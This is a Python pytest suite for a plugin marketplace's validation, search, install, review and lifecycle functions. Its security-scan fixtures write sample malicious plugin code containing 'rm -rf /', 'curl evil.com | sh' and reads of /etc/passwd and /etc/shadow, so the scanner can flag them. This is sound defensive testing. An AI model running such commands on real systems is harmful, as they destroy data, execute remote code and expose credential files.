"""Comprehensive tests for plugin system architecture and lifecycle management.

This module tests plugin discovery, loading, execution, validation, security,
marketplace operations, and complete plugin lifecycle management.
"""

import json
import tempfile
import shutil
from pathlib import Path
from datetime import datetime
from unittest.mock import Mock, patch

import pytest

from src.openeval.plugin_marketplace import (
    PluginStatus,
    PluginType,
    SecurityScanResult,
    PluginVersion,
    PluginAuthor,
    PluginReview,
    PluginStats,
    PluginManifest,
    PluginSearchResult,
    PluginValidator,
    PluginRepository,
    PluginManager,
    create_example_plugin
)


class TestPluginEnums:
    """Test plugin enumeration classes."""
    
    def test_plugin_status_values(self):
        """Test PluginStatus enum values."""
        assert PluginStatus.DRAFT.value == "draft"
        assert PluginStatus.PENDING_REVIEW.value == "pending_review"
        assert PluginStatus.APPROVED.value == "approved"
        assert PluginStatus.PUBLISHED.value == "published"
        assert PluginStatus.DEPRECATED.value == "deprecated"
        assert PluginStatus.SUSPENDED.value == "suspended"
        assert PluginStatus.ARCHIVED.value == "archived"
    
    def test_plugin_type_values(self):
        """Test PluginType enum values."""
        assert PluginType.TASK.value == "task"
        assert PluginType.DATASET.value == "dataset"
        assert PluginType.ADAPTER.value == "adapter"
        assert PluginType.METRIC.value == "metric"
        assert PluginType.EVALUATOR.value == "evaluator"
        assert PluginType.PREPROCESSOR.value == "preprocessor"
        assert PluginType.POSTPROCESSOR.value == "postprocessor"
        assert PluginType.VISUALIZATION.value == "visualization"
        assert PluginType.INTEGRATION.value == "integration"
        assert PluginType.UTILITY.value == "utility"
    
    def test_security_scan_result_values(self):
        """Test SecurityScanResult enum values."""
        assert SecurityScanResult.SAFE.value == "safe"
        assert SecurityScanResult.WARNING.value == "warning"
        assert SecurityScanResult.BLOCKED.value == "blocked"
        assert SecurityScanResult.UNKNOWN.value == "unknown"


class TestPluginDataclasses:
    """Test plugin dataclass structures."""
    
    def test_plugin_version_creation(self):
        """Test PluginVersion dataclass creation and validation."""
        version = PluginVersion(
            version="1.0.0",
            changelog="Initial release",
            release_date=datetime.now(),
            download_url="https://example.com/plugin.zip",
            security_scan=SecurityScanResult.SAFE,
            compatibility=["openeval>=1.0.0"],
            dependencies={"numpy": ">=1.20.0"},
            file_hash="abc123",
            file_size=1024
        )
        
        assert version.version == "1.0.0"
        assert version.security_scan == SecurityScanResult.SAFE
        assert version.dependencies == {"numpy": ">=1.20.0"}
        assert version.file_size == 1024
    
    def test_plugin_author_creation(self):
        """Test PluginAuthor dataclass creation and validation."""
        author = PluginAuthor(
            username="testuser",
            display_name="Test User",
            email="test@example.com",
            profile_url="https://github.com/testuser",
            verified=True,
            reputation_score=95.5,
            plugins_published=10
        )
        
        assert author.username == "testuser"
        assert author.verified is True
        assert author.reputation_score == 95.5
        assert author.plugins_published == 10
    
    def test_plugin_review_creation(self):
        """Test PluginReview dataclass creation."""
        review = PluginReview(
            reviewer="reviewer1",
            rating=5,
            review_text="Excellent plugin!",
            created_at=datetime.now(),
            helpful_count=10,
            verified_download=True
        )
        
        assert review.reviewer == "reviewer1"
        assert review.rating == 5
        assert review.verified_download is True
    
    def test_plugin_stats_defaults(self):
        """Test PluginStats default values."""
        stats = PluginStats()
        
        assert stats.total_downloads == 0
        assert stats.weekly_downloads == 0
        assert stats.rating_average == 0.0
        assert stats.rating_count == 0
        assert isinstance(stats.last_updated, datetime)
        assert isinstance(stats.first_published, datetime)
    
    def test_plugin_manifest_creation(self):
        """Test complete PluginManifest creation."""
        author = PluginAuthor(
            username="testuser",
            display_name="Test User",
            email="test@example.com"
        )
        
        manifest = PluginManifest(
            name="test-plugin",
            display_name="Test Plugin",
            description="A test plugin",
            plugin_type=PluginType.METRIC,
            author=author,
            current_version="1.0.0",
            min_openeval_version="1.0.0",
            homepage="https://example.com",
            license="MIT",
            keywords=["test", "metric"]
        )
        
        assert manifest.name == "test-plugin"
        assert manifest.plugin_type == PluginType.METRIC
        assert manifest.author.username == "testuser"
        assert manifest.status == PluginStatus.DRAFT  # Default value
        assert isinstance(manifest.stats, PluginStats)
        assert isinstance(manifest.reviews, list)


class TestPluginValidator:
    """Test plugin validation system."""
    
    @pytest.fixture
    def validator(self):
        """Create PluginValidator instance."""
        with patch('src.openeval.plugin_marketplace.RealSecurityManager'):
            return PluginValidator()
    
    @pytest.fixture
    def temp_plugin_dir(self):
        """Create temporary plugin directory."""
        temp_dir = Path(tempfile.mkdtemp())
        yield temp_dir
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    def create_valid_plugin_structure(self, plugin_dir: Path):
        """Create a valid plugin directory structure."""
        plugin_dir.mkdir(exist_ok=True)
        
        # Create plugin.json
        manifest = {
            "name": "test-plugin",
            "display_name": "Test Plugin",
            "version": "1.0.0",
            "description": "A test plugin"
        }
        with open(plugin_dir / "plugin.json", "w") as f:
            json.dump(manifest, f)
        
        # Create __init__.py
        (plugin_dir / "__init__.py").write_text('"""Test plugin."""')
        
        # Create main plugin file
        (plugin_dir / "plugin.py").write_text('''
class TestPlugin:
    def evaluate(self, data):
        return {"result": "test"}
''')
        
        # Create README.md
        (plugin_dir / "README.md").write_text("# Test Plugin")
    
    @pytest.mark.asyncio
    async def test_validate_plugin_structure_success(self, validator, temp_plugin_dir):
        """Test successful plugin structure validation."""
        self.create_valid_plugin_structure(temp_plugin_dir)
        
        result = await validator.validate_plugin(temp_plugin_dir)
        
        assert result['structure_valid'] is True
        assert result['manifest_valid'] is True
        assert len(result['errors']) == 0
    
    @pytest.mark.asyncio
    async def test_validate_plugin_missing_files(self, validator, temp_plugin_dir):
        """Test plugin validation with missing required files."""
        temp_plugin_dir.mkdir(exist_ok=True)
        # Don't create required files
        
        result = await validator.validate_plugin(temp_plugin_dir)
        
        assert result['structure_valid'] is False
        assert any('Missing required files' in error for error in result.get('structure_errors', []))
    
    @pytest.mark.asyncio
    async def test_validate_plugin_nonexistent_path(self, validator):
        """Test plugin validation with nonexistent path."""
        nonexistent_path = Path("/nonexistent/path")
        
        result = await validator.validate_plugin(nonexistent_path)
        
        assert result['structure_valid'] is False
        assert any('does not exist' in error for error in result.get('structure_errors', []))
    
    @pytest.mark.asyncio
    async def test_validate_plugin_invalid_manifest(self, validator, temp_plugin_dir):
        """Test plugin validation with invalid manifest."""
        temp_plugin_dir.mkdir(exist_ok=True)
        (temp_plugin_dir / "__init__.py").write_text("")
        
        # Create invalid JSON manifest
        (temp_plugin_dir / "plugin.json").write_text('{"invalid": json}')
        
        result = await validator.validate_plugin(temp_plugin_dir)
        
        assert result['manifest_valid'] is False
        assert len(result['errors']) > 0
    
    @pytest.mark.asyncio
    async def test_security_scan_patterns(self, validator, temp_plugin_dir):
        """Test security scan for dangerous patterns."""
        self.create_valid_plugin_structure(temp_plugin_dir)
        
        # Add dangerous code
        dangerous_code = '''
import os
import subprocess

def dangerous_function():
    eval("print('hello')")
    os.system("rm -rf /")
    subprocess.call(["dangerous", "command"])
'''
        (temp_plugin_dir / "dangerous.py").write_text(dangerous_code)
        
        result = await validator.validate_plugin(temp_plugin_dir)
        
        assert len(result['security_issues']) > 0
        assert result['security_score'] < 100.0


class TestPluginRepository:
    """Test plugin repository operations."""
    
    @pytest.fixture
    def temp_repo_dir(self):
        """Create temporary repository directory."""
        temp_dir = Path(tempfile.mkdtemp())
        yield temp_dir
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    @pytest.fixture
    def repository(self, temp_repo_dir):
        """Create PluginRepository instance."""
        with patch('src.openeval.plugin_marketplace.RealSecurityManager'):
            return PluginRepository(temp_repo_dir)
    
    @pytest.fixture
    def sample_plugin_dir(self):
        """Create sample plugin directory."""
        temp_dir = Path(tempfile.mkdtemp())
        
        # Create plugin structure
        temp_dir.mkdir(exist_ok=True)
        manifest = {
            "name": "sample-plugin",
            "display_name": "Sample Plugin",
            "version": "1.0.0",
            "description": "A sample plugin for testing",
            "plugin_type": "metric",
            "author": "testuser"
        }
        with open(temp_dir / "plugin.json", "w") as f:
            json.dump(manifest, f)
        (temp_dir / "__init__.py").write_text("")
        
        yield temp_dir
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    def test_repository_initialization(self, repository, temp_repo_dir):
        """Test repository initialization."""
        assert repository.repo_path == temp_repo_dir
        assert isinstance(repository.plugins, dict)
        assert hasattr(repository, 'validator')
    
    @pytest.mark.asyncio
    async def test_submit_plugin_success(self, repository, sample_plugin_dir):
        """Test successful plugin submission."""
        author_info = {
            "username": "testuser",
            "display_name": "Test User",
            "email": "test@example.com"
        }
        
        with patch.object(repository.validator, 'validate_plugin') as mock_validate:
            mock_validate.return_value = {
                'valid': True,
                'errors': [],
                'overall_score': 85.0
            }
            
            result = await repository.submit_plugin(sample_plugin_dir, author_info)
        
        assert result['success'] is True
        assert 'plugin_id' in result
        assert result['status'] == PluginStatus.PENDING_REVIEW.value
    
    @pytest.mark.asyncio
    async def test_submit_plugin_validation_failure(self, repository, sample_plugin_dir):
        """Test plugin submission with validation failure."""
        author_info = {
            "username": "testuser",
            "display_name": "Test User",
            "email": "test@example.com"
        }
        
        with patch.object(repository.validator, 'validate_plugin') as mock_validate:
            mock_validate.return_value = {
                'valid': False,
                'errors': ['Invalid manifest'],
                'overall_score': 30.0
            }
            
            result = await repository.submit_plugin(sample_plugin_dir, author_info)
        
        assert result['success'] is False
        assert 'Invalid manifest' in result['errors']
    
    def test_search_plugins_empty_repository(self, repository):
        """Test plugin search in empty repository."""
        results = repository.search_plugins("test")
        assert len(results) == 0
    
    def test_search_plugins_with_results(self, repository):
        """Test plugin search with populated repository."""
        # Add sample plugin to repository
        author = PluginAuthor(
            username="testuser",
            display_name="Test User", 
            email="test@example.com"
        )
        
        manifest = PluginManifest(
            name="search-test-plugin",
            display_name="Search Test Plugin",
            description="A plugin for testing search functionality",
            plugin_type=PluginType.METRIC,
            author=author,
            current_version="1.0.0",
            min_openeval_version="1.0.0",
            keywords=["search", "test"],
            status=PluginStatus.PUBLISHED  # Set to published so search finds it
        )
        
        repository.plugins["search-test-plugin"] = manifest
        
        # Search for plugin
        results = repository.search_plugins("search")
        assert len(results) >= 1
        assert any(result.plugin.name == "search-test-plugin" for result in results)
    
    def test_search_plugins_with_filters(self, repository):
        """Test plugin search with type and author filters."""
        # Add multiple plugins
        author1 = PluginAuthor(username="user1", display_name="User 1", email="user1@example.com")
        author2 = PluginAuthor(username="user2", display_name="User 2", email="user2@example.com")
        
        plugin1 = PluginManifest(
            name="metric-plugin",
            display_name="Metric Plugin",
            description="A metric plugin",
            plugin_type=PluginType.METRIC,
            author=author1,
            current_version="1.0.0",
            min_openeval_version="1.0.0",
            status=PluginStatus.PUBLISHED  # Set to published
        )
        
        plugin2 = PluginManifest(
            name="task-plugin", 
            display_name="Task Plugin",
            description="A task plugin",
            plugin_type=PluginType.TASK,
            author=author2,
            current_version="1.0.0",
            min_openeval_version="1.0.0",
            status=PluginStatus.PUBLISHED  # Set to published
        )
        
        repository.plugins["metric-plugin"] = plugin1
        repository.plugins["task-plugin"] = plugin2
        
        # Search with type filter
        results = repository.search_plugins("plugin", plugin_type=PluginType.METRIC)
        assert len(results) >= 1
        assert all(result.plugin.plugin_type == PluginType.METRIC for result in results)
    
    @pytest.mark.asyncio
    async def test_install_plugin_success(self, repository):
        """Test successful plugin installation."""
        # Mock plugin in repository
        author = PluginAuthor(username="testuser", display_name="Test User", email="test@example.com")
        version = PluginVersion(
            version="1.0.0",
            changelog="Initial release",
            release_date=datetime.now(),
            download_url="https://example.com/plugin.zip"
        )
        
        manifest = PluginManifest(
            name="install-test-plugin",
            display_name="Install Test Plugin",
            description="Plugin for testing installation",
            plugin_type=PluginType.UTILITY,
            author=author,
            current_version="1.0.0",
            min_openeval_version="1.0.0",
            versions=[version]
        )
        
        repository.plugins["install-test-plugin"] = manifest
        
        with patch('src.openeval.plugin_marketplace.HAS_REQUESTS', True), \
             patch('requests.get') as mock_get, \
             patch('zipfile.ZipFile') as mock_zip:
            
            # Mock successful download
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.content = b"fake zip content"
            mock_get.return_value = mock_response
            
            # Mock zip extraction
            mock_zip_instance = Mock()
            mock_zip.return_value.__enter__.return_value = mock_zip_instance
            
            result = await repository.install_plugin("install-test-plugin")
        
        assert result['success'] is True
        assert 'installed_path' in result
    
    @pytest.mark.asyncio
    async def test_install_plugin_not_found(self, repository):
        """Test plugin installation when plugin not found."""
        result = await repository.install_plugin("nonexistent-plugin")
        
        assert result['success'] is False
        assert 'not found' in result['error'].lower()
    
    def test_add_review_success(self, repository):
        """Test adding review to plugin."""
        # Add plugin to repository
        author = PluginAuthor(username="testuser", display_name="Test User", email="test@example.com")
        manifest = PluginManifest(
            name="review-test-plugin",
            display_name="Review Test Plugin",
            description="Plugin for testing reviews",
            plugin_type=PluginType.METRIC,
            author=author,
            current_version="1.0.0",
            min_openeval_version="1.0.0"
        )
        
        repository.plugins["review-test-plugin"] = manifest
        
        # Mock the _save_manifest method to avoid JSON serialization issues
        with patch.object(repository, '_save_manifest') as mock_save:
            # Add review
            success = repository.add_review(
                "review-test-plugin",
                "reviewer1", 
                5,
                "Great plugin!",
                verified_download=True
            )
        
        assert success is True
        
        # Check review was added
        plugin = repository.plugins["review-test-plugin"]
        assert len(plugin.reviews) == 1
        assert plugin.reviews[0].reviewer == "reviewer1"
        assert plugin.reviews[0].rating == 5
        assert plugin.reviews[0].verified_download is True


class TestPluginManager:
    """Test plugin manager operations."""
    
    @pytest.fixture
    def temp_manager_dir(self):
        """Create temporary manager directory."""
        temp_dir = Path(tempfile.mkdtemp())
        yield temp_dir
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    @pytest.fixture
    def plugin_manager(self, temp_manager_dir):
        """Create PluginManager instance."""
        with patch('src.openeval.plugin_marketplace.RealSecurityManager'):
            return PluginManager(temp_manager_dir)
    
    def test_manager_initialization(self, plugin_manager, temp_manager_dir):
        """Test plugin manager initialization."""
        assert plugin_manager.repository.repo_path == temp_manager_dir
        assert isinstance(plugin_manager.installed_plugins, dict)
    
    def test_discover_installed_plugins(self, plugin_manager):
        """Test discovery of installed plugins.""" 
        # Create a temporary directory structure
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            plugins_dir = temp_path / '.openeval' / 'plugins'
            test_plugin_dir = plugins_dir / 'test-plugin'
            
            # Create the directory structure
            test_plugin_dir.mkdir(parents=True)
            
            # Create plugin manifest
            (test_plugin_dir / 'plugin.json').write_text('{}')
            
            # Mock Path.home() to return our temp directory
            with patch('src.openeval.plugin_marketplace.Path.home', return_value=temp_path):
                plugin_manager._discover_installed_plugins()
        
        assert "test-plugin" in plugin_manager.installed_plugins
    
    @pytest.mark.asyncio
    async def test_submit_plugin_delegate(self, plugin_manager):
        """Test plugin submission delegation to repository."""
        plugin_path = Path("/test/plugin")
        author_info = {"username": "test"}
        
        with patch.object(plugin_manager.repository, 'submit_plugin') as mock_submit:
            mock_submit.return_value = {"success": True}
            
            result = await plugin_manager.submit_plugin(plugin_path, author_info)
        
        assert result == {"success": True}
        mock_submit.assert_called_once_with(plugin_path, author_info)
    
    def test_search_delegate(self, plugin_manager):
        """Test plugin search delegation to repository."""
        with patch.object(plugin_manager.repository, 'search_plugins') as mock_search:
            mock_search.return_value = []
            
            results = plugin_manager.search("test")
        
        assert results == []
        mock_search.assert_called_once_with("test")
    
    @pytest.mark.asyncio
    async def test_install_success(self, plugin_manager):
        """Test successful plugin installation."""
        with patch.object(plugin_manager.repository, 'install_plugin') as mock_install:
            mock_install.return_value = {
                "success": True,
                "installed_path": "/path/to/installed/plugin"
            }
            
            result = await plugin_manager.install("test-plugin")
        
        assert result["success"] is True
        assert "test-plugin" in plugin_manager.installed_plugins
    
    def test_uninstall_success(self, plugin_manager):
        """Test successful plugin uninstallation."""
        # Add installed plugin
        plugin_manager.installed_plugins["test-plugin"] = Path("/fake/path")
        
        with patch('shutil.rmtree') as mock_rmtree:
            result = plugin_manager.uninstall("test-plugin")
        
        assert result is True
        assert "test-plugin" not in plugin_manager.installed_plugins
        mock_rmtree.assert_called_once()
    
    def test_uninstall_not_installed(self, plugin_manager):
        """Test uninstalling plugin that is not installed."""
        result = plugin_manager.uninstall("nonexistent-plugin")
        assert result is False
    
    def test_list_installed(self, plugin_manager):
        """Test listing installed plugins."""
        plugin_manager.installed_plugins = {
            "plugin1": Path("/path1"),
            "plugin2": Path("/path2")
        }
        
        installed = plugin_manager.list_installed()
        assert set(installed) == {"plugin1", "plugin2"}
    
    def test_add_review_delegate(self, plugin_manager):
        """Test adding review delegation to repository."""
        plugin_manager.installed_plugins["test-plugin"] = Path("/path")
        
        with patch.object(plugin_manager.repository, 'add_review') as mock_add_review:
            mock_add_review.return_value = True
            
            result = plugin_manager.add_review("test-plugin", "reviewer", 5, "Great!")
        
        assert result is True
        mock_add_review.assert_called_once_with("test-plugin", "reviewer", 5, "Great!", True)


class TestPluginExampleCreation:
    """Test example plugin creation functionality."""
    
    @pytest.fixture
    def temp_output_dir(self):
        """Create temporary output directory."""
        temp_dir = Path(tempfile.mkdtemp())
        yield temp_dir
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    def test_create_example_plugin(self, temp_output_dir):
        """Test creation of example plugin structure."""
        create_example_plugin(temp_output_dir)
        
        # Check required files were created
        assert (temp_output_dir / 'plugin.json').exists()
        assert (temp_output_dir / '__init__.py').exists()
        assert (temp_output_dir / 'sentiment_analyzer.py').exists()
        assert (temp_output_dir / 'README.md').exists()
        
        # Validate plugin.json content
        with open(temp_output_dir / 'plugin.json') as f:
            manifest = json.load(f)
        
        assert manifest['name'] == 'example-sentiment-analyzer'
        assert manifest['plugin_type'] == 'metric'
        assert 'dependencies' in manifest
        assert 'textblob' in manifest['dependencies']
        
        # Validate __init__.py content
        init_content = (temp_output_dir / '__init__.py').read_text()
        assert 'SentimentAnalyzer' in init_content
        assert '__version__' in init_content
        
        # Validate main plugin file
        plugin_content = (temp_output_dir / 'sentiment_analyzer.py').read_text()
        assert 'class SentimentAnalyzer' in plugin_content
        assert 'def evaluate' in plugin_content
        assert 'TextBlob' in plugin_content
    
    def test_example_plugin_structure_validation(self, temp_output_dir):
        """Test that example plugin passes validation."""
        create_example_plugin(temp_output_dir)
        
        # Create validator and test structure
        with patch('src.openeval.plugin_marketplace.RealSecurityManager'):
            validator = PluginValidator()
        
        # Check required files exist
        assert (temp_output_dir / 'plugin.json').exists()
        assert (temp_output_dir / '__init__.py').exists()
        
        # Validate manifest is proper JSON
        with open(temp_output_dir / 'plugin.json') as f:
            manifest_data = json.load(f)
            assert isinstance(manifest_data, dict)
            assert 'name' in manifest_data
            assert 'version' in manifest_data


class TestPluginLifecycleIntegration:
    """Test complete plugin lifecycle integration."""
    
    @pytest.fixture
    def integration_setup(self):
        """Set up integration test environment."""
        temp_dir = Path(tempfile.mkdtemp())
        
        setup = {
            'repo_dir': temp_dir / 'repo',
            'plugin_dir': temp_dir / 'plugin',
            'manager': None,
            'temp_dir': temp_dir
        }
        
        # Create plugin manager
        setup['repo_dir'].mkdir(parents=True)
        with patch('src.openeval.plugin_marketplace.RealSecurityManager'):
            setup['manager'] = PluginManager(setup['repo_dir'])
        
        # Create example plugin
        setup['plugin_dir'].mkdir(parents=True)
        create_example_plugin(setup['plugin_dir'])
        
        yield setup
        
        # Cleanup
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    @pytest.mark.asyncio
    async def test_full_plugin_lifecycle(self, integration_setup):
        """Test complete plugin lifecycle: submit -> search -> install -> uninstall."""
        manager = integration_setup['manager']
        plugin_dir = integration_setup['plugin_dir']
        
        # 1. Submit plugin
        author_info = {
            "username": "testuser",
            "display_name": "Test User",
            "email": "test@example.com"
        }
        
        with patch.object(manager.repository.validator, 'validate_plugin') as mock_validate:
            mock_validate.return_value = {
                'valid': True,
                'errors': [],
                'overall_score': 90.0,
                'structure_valid': True,
                'manifest_valid': True,
                'security_score': 95.0
            }
            
            submit_result = await manager.submit_plugin(plugin_dir, author_info)
        
        assert submit_result['success'] is True
        
        # 2. Search for plugin
        search_results = manager.search("sentiment")
        assert len(search_results) > 0
        
        found_plugin = None
        for result in search_results:
            if "sentiment" in result.plugin.name.lower():
                found_plugin = result.plugin
                break
        
        assert found_plugin is not None
        
        # 3. Simulate installation (mocked)
        with patch.object(manager.repository, 'install_plugin') as mock_install:
            mock_install.return_value = {
                'success': True,
                'installed_path': '/fake/install/path'
            }
            
            install_result = await manager.install(found_plugin.name)
        
        assert install_result['success'] is True
        assert found_plugin.name in manager.installed_plugins
        
        # 4. List installed plugins
        installed = manager.list_installed()
        assert found_plugin.name in installed
        
        # 5. Add review
        review_success = manager.add_review(
            found_plugin.name,
            "reviewer1",
            5,
            "Excellent sentiment analysis plugin!"
        )
        assert review_success is True
        
        # 6. Uninstall plugin
        with patch('shutil.rmtree'):
            uninstall_success = manager.uninstall(found_plugin.name)
        
        assert uninstall_success is True
        assert found_plugin.name not in manager.installed_plugins


class TestPluginSecurityAndValidation:
    """Test plugin security scanning and validation edge cases."""
    
    @pytest.fixture
    def security_validator(self):
        """Create validator with security manager."""
        mock_security_manager = Mock()
        mock_security_manager.scan_file.return_value = {
            'threats_found': 0,
            'security_score': 100.0
        }
        
        return PluginValidator(mock_security_manager)
    
    @pytest.fixture
    def malicious_plugin_dir(self):
        """Create plugin with security issues."""
        temp_dir = Path(tempfile.mkdtemp())
        temp_dir.mkdir(exist_ok=True)
        
        # Create valid structure
        manifest = {
            "name": "malicious-plugin",
            "display_name": "Malicious Plugin",
            "version": "1.0.0",
            "description": "A plugin with security issues"
        }
        with open(temp_dir / "plugin.json", "w") as f:
            json.dump(manifest, f)
        
        (temp_dir / "__init__.py").write_text("")
        
        # Add malicious code
        malicious_code = '''
import os
import subprocess
import sys

# Dangerous operations
def dangerous_eval():
    eval("__import__('os').system('rm -rf /')")

def dangerous_exec():
    exec(compile("print('danger')", "test", "exec"))

def dangerous_subprocess():
    subprocess.call(["dangerous", "command"])

def dangerous_system():
    os.system("curl evil.com | sh")

def dangerous_import():
    __import__("dangerous_module")

def dangerous_file_ops():
    open("/etc/passwd", "r").read()
    file("/etc/shadow", "r")

def dangerous_input():
    input("Enter dangerous command: ")
    raw_input("Enter more danger: ")
'''
        (temp_dir / "malicious.py").write_text(malicious_code)
        
        yield temp_dir
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    @pytest.mark.asyncio
    async def test_security_pattern_detection(self, security_validator, malicious_plugin_dir):
        """Test detection of dangerous security patterns."""
        result = await security_validator.validate_plugin(malicious_plugin_dir)
        
        # Should detect multiple security issues
        assert len(result['security_issues']) > 0
        assert result['security_score'] < 100.0
        
        # Check specific patterns are detected
        security_issues_text = ' '.join(result['security_issues'])
        assert any(pattern in security_issues_text for pattern in [
            'eval(', 'exec(', 'subprocess.', 'os.system', '__import__'
        ])
    
    @pytest.mark.asyncio
    async def test_validation_with_missing_optional_dependencies(self, security_validator):
        """Test validation when optional dependencies are missing."""
        temp_dir = Path(tempfile.mkdtemp())
        temp_dir.mkdir(exist_ok=True)
        
        # Create plugin that requires optional dependencies
        manifest = {
            "name": "optional-deps-plugin",
            "version": "1.0.0",
            "dependencies": {
                "nonexistent-package": ">=1.0.0"
            }
        }
        
        with open(temp_dir / "plugin.json", "w") as f:
            json.dump(manifest, f)
        
        (temp_dir / "__init__.py").write_text("")
        
        try:
            result = await security_validator.validate_plugin(temp_dir)
            # Should handle missing dependencies gracefully
            assert 'valid' in result
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
    
    def test_plugin_search_result_relevance_scoring(self):
        """Test plugin search result relevance scoring."""
        author = PluginAuthor(
            username="testuser",
            display_name="Test User",
            email="test@example.com"
        )
        
        plugin = PluginManifest(
            name="test-search-plugin",
            display_name="Test Search Plugin",
            description="A plugin for testing search relevance scoring",
            plugin_type=PluginType.UTILITY,
            author=author,
            current_version="1.0.0",
            min_openeval_version="1.0.0",
            keywords=["test", "search", "utility"]
        )
        
        search_result = PluginSearchResult(
            plugin=plugin,
            relevance_score=85.5,
            match_reasons=["name match", "keyword match", "description match"]
        )
        
        assert search_result.relevance_score == 85.5
        assert len(search_result.match_reasons) == 3
        assert "name match" in search_result.match_reasons


if __name__ == "__main__":
    pytest.main([__file__])